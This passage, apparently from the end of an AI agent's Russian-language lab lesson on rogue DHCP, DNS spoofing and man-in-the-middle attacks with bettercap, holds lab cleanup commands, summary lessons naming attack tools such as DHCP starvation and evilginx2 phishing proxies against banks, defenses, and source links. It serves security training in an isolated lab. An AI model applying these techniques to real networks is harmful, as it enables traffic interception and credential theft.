dig bank.example @192.168.56.10   # должен выдать 192.168.56.10

# Cleanup
sudo killall bettercap
sudo rm /tmp/bettercap-evil.log /tmp/rogue-mitm-vm/mitm-dhcp.pcap
nmcli connection down "Wired connection 1" && nmcli connection up "Wired connection 1"
```

---

## 13. Связанные материалы

- **`intel/lessons/lesson-004-mitm-bettercap.md`** — ARP-spoof + http(s).proxy на loopback. Методологический предок.
- **`intel/techniques/mitm-2026.md`** — TLS 1.3, CT, pinning, HSTS, DoH, ECH, QUIC. Теоретический фон.
- **`intel/techniques/iso-mitm-lab-build.md`** (эта неделя) — как развернуть host-only с Kali + 2 жертвами + gateway.
- **`intel/lessons/lesson-011-kev-triage-workflow.md`** (Хранитель) — если выявлен CVE в реализации (Dnsmasq, ISC Kea) → scoring из `intel/techniques/cve-impact-rating.md`.
- **`agents/mayak/SKILLS.md`** § 2 (LAN MITM) — общая картина bettercap-caplet'ов.
- **`agents/mayak/TOOLS.md`** — где что лежит (bettercap путь, отсутствие UTM).

---

## 14. Lessons

1. **Rogue DHCP — наиболее эффективный "first-strike" вектор в L2-сетях.** Один broadcast, один ответ — весь шлюз + DNS наш.
2. **DHCP starvation — DoS-этап, не сама атака.** Делаем пусто для легитимного DHCP. Перебор → в KEV/CVE, detectable на коммутаторе.
3. **DNS spoof — следующий шаг ПОСЛЕ успешного DHCP-rogue или ARP-spoof.** Без DoH/DoT — открытый канал для forge.
4. **sslstrip/hstshijack мёртв против HSTS preload.** В 2026 большинство банков — в preload list. Работает для typo-squatting на незарегистрированных сайтах.
5. **evilginx2 — реальный AitM.** TLS-валидный (LE cert), прокси к банку. Защита: FIDO2/WebAuthn, mTLS, certificate-bound cookies.
6. **Лучшая защита — defense-in-depth.** DHCP snooping + DAI + DNSSEC + HSTS + DoH + (опц.) pinning.
7. **DHCP-spoof detectable** через ARP table mismatches, gratuitous ARP. Suricata/Zeek сигнатуры можно построить.
8. **Методология bettercap 2026:** модули `dhcp.spoof`, `dns.spoof`, `http.proxy` живы. Caplet-стек: bettercap + dnsmasq (rogue DHCP fallback) + dnschef (DNS proxy) + evilginx2 (AitM).

---

## 15. Что НЕ покрыто (next steps)

| Что | Почему | Когда доделать |
|---|---|---|
| Реальный bettercap MITM на VM | нет гипервизора | когда владелец поставит UTM/VirtualBox |
| IPv6 DHCPv6 / Router Advertisement (mitm6) | отдельная техника | отдельный lesson |
| Wi-Fi evil twin + WPA2 downgrade | нет monitor-mode адаптера | когда докупит AWUS1900 |
| 802.1X EAP attack (hostapd-wpe + eaphammer) | нужен RADIUS-стенд | отдельный lesson |
| AD CS relay через IPv6 DNS takeover (ESC8) | AD-spec | lesson-014 |
| QUIC handshake MITM | QUIC reset injection | когда разберёмся с aioquic |
| ECH downgrade attack | ECH в 2026 ещё не везде | отслеживать draft-ietf-tls-esni |

---

## 16. Источники

### Официальная документация
- bettercap docs — dhcp.spoof: https://www.bettercap.org/modules/ethernet/spoofers/dhcpspoof/
- bettercap docs — dns.spoof: https://www.bettercap.org/modules/ethernet/spoofers/dnsspoof/
- bettercap docs — arp.spoof: https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/
- bettercap docs — dhcp.dos: https://www.bettercap.org/modules/ethernet/spoofers/dhcpdos/
- bettercap docs — http.proxy: https://www.bettercap.org/modules/ethernet/proxies/httpproxy/
- bettercap caplets: https://github.com/bettercap/caplets (hstshijack, http-req-dump, login-manager-abuse)
- yersinia: https://github.com/tomac/yersinia
- evilginx2: https://github.com/kgretzky/evilginx2
- dnschef: https://github.com/iphelix/dnschef

### RFC / Standards
- RFC 2131 — Dynamic Host Configuration Protocol — https://datatracker.ietf.org/doc/html/rfc2131
- RFC 2132 — DHCP Options and BOOTP Vendor Extensions — https://datatracker.ietf.org/doc/html/rfc2132
- RFC 4033/4034/4035 — DNSSEC — https://datatracker.ietf.org/doc/html/rfc4033
- RFC 6797 — HSTS — https://datatracker.ietf.org/doc/html/rfc6797
- RFC 7858 — DNS over TLS — https://datatracker.ietf.org/doc/html/rfc7858
- RFC 8484 — DNS over HTTPS — https://datatracker.ietf.org/doc/html/rfc8484
- RFC 8415 — DHCPv6 — https://datatracker.ietf.org/doc/html/rfc8415

### Vendor / Defensive
- Cisco DHCP Snooping + DAI: https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst2960x/software/15-0_2_EX/security/configuration_guide/
- Juniper DHCP Security: https://www.juniper.net/documentation/us/en/software/junos/security-services/
- Suricata rules DHCP: https://suricata.readthedocs.io/en/latest/rules/index.html
- Zeek DHCP log: https://docs.zeek.org/en/master/scripts/base/protocols/dhcp/main.zeek.html
- HSTS preload: https://hstspreload.org

### Хранилище стенда
- Loopback-демо файлы: `/tmp/rogue-mitm/` (dhcp-spoof-demo.py, dhcp-starvation.py, rogue-mitm-full.cap)
- При появлении VM — `/tmp/rogue-mitm-vm/` (с реальными pcap-артефактами)

---

*Создано 13.07.2026 Маяком 🛰 в рамках Недели 2 (catch-up после пропуска дедлайна 10.07). Только изолированная VM-сеть. Применять только в scope (см. `agents/shared/RULES.md`).*
